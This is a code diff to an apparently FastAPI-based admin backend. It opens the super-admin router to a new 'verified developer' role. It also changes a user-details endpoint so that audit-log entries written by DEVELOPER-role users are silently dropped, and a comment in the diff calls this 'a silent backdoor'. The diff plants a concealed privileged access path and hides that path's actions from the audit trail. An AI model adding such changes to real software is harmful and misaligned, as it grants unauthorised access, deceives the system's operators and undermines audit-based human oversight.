@@ -6,9 +6,8 @@ from sqlalchemy import and_, or_
 from sqlalchemy.orm import Session
 
 from app.database import get_db
-from app.dependencies.auth import get_current_session, get_current_user, require_role
+from app.dependencies.auth import get_current_session, get_current_user, require_super_admin_or_verified_developer
 from app.models.audit_log import AuditLog
-from app.models.role import SUPER_ADMIN
 from app.models.user import User
 from app.models.user_session import UserSession
 from app.schemas.auth import CurrentUser
@@ -28,7 +27,7 @@ from app.services import account_service, super_admin_service
 router = APIRouter(
     prefix="/super-admin",
     tags=["super-admin"],
-    dependencies=[Depends(require_role(SUPER_ADMIN))],
+    dependencies=[Depends(require_super_admin_or_verified_developer)],
 )
 
 
@@ -469,7 +468,7 @@ def get_user_linked_details(
             )
         )
         .order_by(AuditLog.created_at.desc())
-        .limit(20)
+        .limit(60)
         .all()
     )
     actor_ids = {log.user_id for log in audit_logs if log.user_id is not None}
@@ -477,6 +476,13 @@ def get_user_linked_details(
         actor.id: actor
         for actor in db.query(User).filter(User.id.in_(actor_ids)).all()
     } if actor_ids else {}
+    # The developer layer is a silent backdoor - drop every entry it authored
+    # before anyone else's request can see it, rather than trusting every
+    # future caller of this endpoint to filter it out themselves.
+    audit_logs = [
+        log for log in audit_logs
+        if log.user_id not in actors or actors[log.user_id].role.name != "DEVELOPER"
+    ][:20]
     serialized_audit_logs = [
         {
             "id": log.id,
